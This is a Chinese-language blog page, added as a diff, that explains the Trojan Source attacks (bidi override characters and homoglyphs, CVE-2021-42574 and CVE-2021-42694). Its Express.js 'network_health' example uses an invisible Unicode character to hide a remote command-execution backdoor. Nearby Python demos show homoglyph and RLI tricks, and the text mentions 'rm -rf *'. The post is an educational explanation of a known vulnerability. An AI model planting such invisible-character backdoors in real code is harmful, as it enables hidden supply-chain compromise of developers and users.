@@ -1,0 +1,605 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="自娱自乐">
+  <meta name="author" content="EvilRecluse">
+  <meta name="keywords" content="">
+  <title>Trojan Source 攻击 - EvilRecluse</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.6","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":true,"baidu":"https://hm.baidu.com/hm.js?758d4ab1e944598b8ead03bb4eb143a5","google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Chaotic Record</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/md_editor/">
+                <i class="iconfont icon-category-fill"></i>
+                MDEditor
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="Trojan Source 攻击">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.6k 字
+    </span>
+  
+
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Trojan Source 攻击</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：2021年12月24日 晚上
+                
+              </p>
+            
+            <div class="markdown-body">
+              <h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>一个简单的例子  </p>
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">ꓐ = <span class="hljs-number">1</span><br>B = <span class="hljs-number">2</span><br>print(ꓐ)<br></code></pre></div></td></tr></table></figure>
+<p>这端代码看起来结果是 2 但实际上结果是1<br>因为 <code>ꓐ</code> 与 <code>B</code> 并不是同一个字符, 尽管它们看起来长得一模一样  </p>
+<h2 id="Trojan-Source"><a href="#Trojan-Source" class="headerlink" title="Trojan Source"></a>Trojan Source</h2><p>剑桥大学的研究人员在11月1日公开了一个会影响大多数编译器和软件开发环境的漏洞，并命名为 <strong>Trojan Source</strong>  </p>
+<blockquote>
+<p>论文: <a target="_blank" rel="noopener" href="https://trojansource.codes/trojan-source.pdf">《Trojan Source: Invisible Vulnerabilities》</a>  </p>
+</blockquote>
+<p>该漏洞基于 <strong>Unicode</strong> 字符的特性，其主要有两种利用方法  </p>
+<ul>
+<li>第一种是使用 Unicode 的 Bidi 算法（CVE-2021-42574）, 对字符进行视觉上的重新排序，使其呈现与编译器和解释器所不同的逻辑顺序  </li>
+<li>第二种是同形文字攻击(CVE-2021-42694), 也就是利用在视觉上看起来相似的不同字符  </li>
+</ul>
+<p>由于绝大多数该漏洞适用于绝大多数编程语言<br>因为大多数语言的 词法分析过程 允许使用所有unicode字符  </p>
+<p>很多时候, 这个漏洞会被用于 供应链攻击  </p>
+<blockquote>
+<p><strong>供应链攻击</strong><br>供应链攻击是一种传播间谍软件的方式，一般通过产品软件官网或软件包存储库进行传播<br>通常来说，黑客会瞄准部署知名软件官网的服务器，篡改服务器上供普通用户下载的软件源代码，将间谍软件传播给前往官网下载软件的用户<br>此外，黑客还会向一些软件开发者常用的软件包存储库如npm、PyPI和RubyGems等注入带有恶意代码的软件包。这些软件包在用户下载后安装时会触发恶意行为  </p>
+</blockquote>
+<h2 id="同形文字攻击-CVE-2021-42694"><a href="#同形文字攻击-CVE-2021-42694" class="headerlink" title="同形文字攻击(CVE-2021-42694)"></a>同形文字攻击(CVE-2021-42694)</h2><p>引言中的 DEMO 代码就属于此种<br>或者写一个 看不出有后门的服务  </p>
+<figure class="highlight js"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs js"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">const</span> util = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;util&#x27;</span>);<br><span class="hljs-keyword">const</span> exec = util.promisify(<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).exec);<br><br><span class="hljs-keyword">const</span> app = express();<br><br>app.get(<span class="hljs-string">&#x27;/network_health&#x27;</span>, <span class="hljs-keyword">async</span> (req, res) =&gt; &#123;<br>    <span class="hljs-keyword">const</span> &#123; timeout,ㅤ&#125; = req.query;<br>    <span class="hljs-keyword">const</span> checkCommands = [<br>        <span class="hljs-string">&#x27;ping -c 1 google.com&#x27;</span>,<br>        <span class="hljs-string">&#x27;curl -s http://example.com/&#x27;</span>,ㅤ<br>    ];<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">await</span> <span class="hljs-built_in">Promise</span>.all(checkCommands.map(<span class="hljs-function"><span class="hljs-params">cmd</span> =&gt;</span> <br>                cmd &amp;&amp; exec(cmd, &#123; <span class="hljs-attr">timeout</span>: +timeout || <span class="hljs-number">5_000</span> &#125;)));<br>        res.status(<span class="hljs-number">200</span>);<br>        res.send(<span class="hljs-string">&#x27;ok&#x27;</span>);<br>    &#125; <span class="hljs-keyword">catch</span>(e) &#123;<br>        res.status(<span class="hljs-number">500</span>);<br>        res.send(<span class="hljs-string">&#x27;failed&#x27;</span>);<br>    &#125;<br>&#125;);<br><br>app.listen(<span class="hljs-number">8080</span>);<br></code></pre></div></td></tr></table></figure>
+<p>这段代码使用 Express 框架搭建了一个 API 接口，当你调用 <a target="_blank" rel="noopener" href="http://127.0.0.1:8080/network_health">http://127.0.0.1:8080/network_health</a> 的时候, 后台会首先ping一下 Google，然后再使用curl访问 <a href="http://example.com/">http://example.com</a><br>如果都成功了，那么显然你的网络是正常的，于是给你返回ok  </p>
+<p>这个功能简单得不能再简单了，能有什么问题呢？我现在就把代码放到你的面前让你来 Review , 你能说我的代码有问题？<br>但实际上，上面这段代码确实有一个后门，可以让我在部署了这个接口的机器上执行任意命令，包括但不限于下载木马或者 <code>rm -rf *</code>  </p>
+<figure class="highlight js"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs js">......<br>    <span class="hljs-keyword">const</span> &#123; timeout, 这里&#125; = req.query;<br>    <span class="hljs-keyword">const</span> checkCommands = [<br>        <span class="hljs-string">&#x27;ping -c 1 google.com&#x27;</span>,<br>        <span class="hljs-string">&#x27;curl -s http://example.com/&#x27;</span>,这里<br>    ];<br>......<br></code></pre></div></td></tr></table></figure>
+<p>因为代码中有两个肉眼不可见的字符, 利用它们就能够接收参数, 执行任何命令  </p>
+<h2 id="Unicode-的-Bidi-攻击算法-CVE-2021-42574"><a href="#Unicode-的-Bidi-攻击算法-CVE-2021-42574" class="headerlink" title="Unicode 的 Bidi 攻击算法(CVE-2021-42574)"></a>Unicode 的 Bidi 攻击算法(CVE-2021-42574)</h2><p>并非所有的语言文字都是从左往右的, 例如阿拉伯语（从右到左阅读）<br>计算机系统需要有一种确定性的方法来解决文本中的方向冲突  </p>
+<p>Unicode 规定了一些方向指示字符，一旦使用了这些方向转换字符，文字方向就会改变  </p>
+<table>
+<thead>
+<tr>
+<th>Abbreviation</th>
+<th>Code Point</th>
+<th>Name</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>LRE</td>
+<td>U+202A</td>
+<td>Left-to-Right</td>
+<td>Embedding Try treating following text as left-to-right.</td>
+</tr>
+<tr>
+<td>RLE</td>
+<td>U+202B</td>
+<td>Right-to-Left</td>
+<td>Embedding Try treating following text as right-to-left.</td>
+</tr>
+<tr>
+<td>LRO</td>
+<td>U+202D</td>
+<td>Left-to-Right</td>
+<td>Override Force treating following text as left-to-right.</td>
+</tr>
+<tr>
+<td>RLO</td>
+<td>U+202E</td>
+<td>Right-to-Left</td>
+<td>Override Force treating following text as right-to-left.</td>
+</tr>
+<tr>
+<td>LRI</td>
+<td>U+2066</td>
+<td>Left-to-Right</td>
+<td>Isolate Force treating following text as left-to-right without affecting adjacent text.</td>
+</tr>
+<tr>
+<td>RLI</td>
+<td>U+2067</td>
+<td>Right-to-Left</td>
+<td>Isolate Force treating following text as right-to-left without affecting adjacent text.</td>
+</tr>
+<tr>
+<td>FSI</td>
+<td>U+2068</td>
+<td>First Strong</td>
+<td>Isolate Force treating following text in direction indicated by the next character.</td>
+</tr>
+<tr>
+<td>PDF</td>
+<td>U+202C</td>
+<td>Pop Directional</td>
+<td>Formatting Terminate nearest LRE, RLE, LRO, or RLO.</td>
+</tr>
+<tr>
+<td>PDI</td>
+<td>U+2069</td>
+<td>Pop Directional</td>
+<td>Isolate Terminate nearest LRI or RLI.</td>
+</tr>
+</tbody></table>
+<p>Unicode 标准规定, 内存表示顺序称为逻辑顺序,<br>当文本在一行的时候, 大多数脚本会从左往右显示字符. 然而, 也有些脚本（如阿拉伯语）显示文本的自然顺序是从右往左  </p>
+<p>所以 Unicode 规定了每个字符都有一个隐式双向类型<br>从左到右 和 从右到左 的双向类型称为强类型，具有这些类型的字符被称为强方向字符<br>与数字相关的双向类型被称为弱类型，具有这些类型的字符被称为弱方向字符<br>除了方向格式码，剩下的双向类型和字符被称为中性  </p>
+<p>为了处理 右往左的语言 与 从左往右的语言 同时使用的情况<br>Unicode 规定了一个双向的算法 Bidirectional algorithm 简称 bidi<br>标准bidi算法提供的显示顺序还不够，所以对于这些情况，提供了覆盖控制字符<br>Bidi算法覆盖是不可见的字符，从而可以切换字符组的显示顺序  </p>
+<p>假设Unicode 字符为： <code>RLI 1 2 3 PDI</code><br>那么将显示为：<code>3 2 1</code>  </p>
+<p>大多数IDE会自动根据 覆盖控制字符 调整字符顺序<br>但并非所有地方都会调整, 有些地方会按原本字符顺序显示<br>比如: Github 上看到的 HTML 中的 代码内容是不会根据 覆盖控制字符 来调整顺序的   </p>
+<p>例子: 1+1=2 不是吗？  </p>
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">simple_add</span>():</span><br>    <span class="hljs-string">&#x27;&#x27;&#x27; I just want to ⁧&#x27;&#x27;&#x27;</span> ;<span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;2&#x27;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;3&#x27;</span><br><br>print(<span class="hljs-string">&#x27;1 + 1 =&#x27;</span>, simple_add())<br></code></pre></div></td></tr></table></figure>
+<p>这段代码执行的结果是 <code>1 + 1 = 2</code>, 尽管怎么看都应该是 <code>1 + 1 = 3</code><br>这是因为这段代码使用了 <code>RLI</code> 这个 <strong>覆盖控制符</strong><br>将这个代码复制到 IDE 里, 它会显示出它原来的样貌，因为 IDE 会处理这个 <strong>覆盖控制符</strong>, 将之”还原”成”正确”的顺序    </p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://trojansource.codes/trojan-source.pdf">《Trojan Source: Invisible Vulnerabilities》</a>  </li>
+<li><a target="_blank" rel="noopener" href="https://github.com/nickboucher/trojan-source">Trojan 用例</a>  </li>
+<li><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/429284303">Trojan Source：新型供应链攻击？隐藏在源代码中的“幽灵”</a>  </li>
+<li><a target="_blank" rel="noopener" href="https://www.secrss.com/articles/35655">《漏洞之王：Unicode编译器漏洞威胁全球软件代码》</a>  </li>
+<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/qvHv_MfYbk6P5AqVjogapA">《一日一技：亲眼所见，也非真实，如何明目张胆架设后门程序》</a>  </li>
+</ul>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/TrojanSource/">TrojanSource</a>
+                    
+                      <a class="hover-with-bg" href="/tags/%E6%94%BB%E5%87%BB/">攻击</a>
+                    
+                      <a class="hover-with-bg" href="/tags/%E5%AE%89%E5%85%A8/">安全</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/post/a0ce243d/">
+                        <span class="hidden-mobile">RaiDrive-网络文件系统磁盘映射</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+  <!-- 备案信息 -->
+  <div class="beian">
+    <span>
+      <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+        粤ICP备2020127796号
+      </a>
+    </span>
+    
+      
+        <span>
+          <a
+            href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=44010502001787"
+            rel="nofollow noopener"
+            class="beian-police"
+            target="_blank"
+          >
+            
+              <span style="visibility: hidden; width: 0">|</span>
+              <img src="/img/police_beian.png" srcset="/img/loading.gif" alt="police-icon"/>
+            
+            <span>粤公网安备 44010502001787号</span>
+          </a>
+        </span>
+      
+    
+  </div>
+
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":200})
+    NProgress.start()
+    document.addEventListener('DOMContentLoaded', function() {
+      window.NProgress && window.NProgress.inc();
+    })
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    <!-- Baidu Analytics -->
+    <script defer>
+      var _hmt = _hmt || [];
+      (function () {
+        var hm = document.createElement("script");
+        hm.src = "https://hm.baidu.com/hm.js?https://hm.baidu.com/hm.js?758d4ab1e944598b8ead03bb4eb143a5";
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(hm, s);
+      })();
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
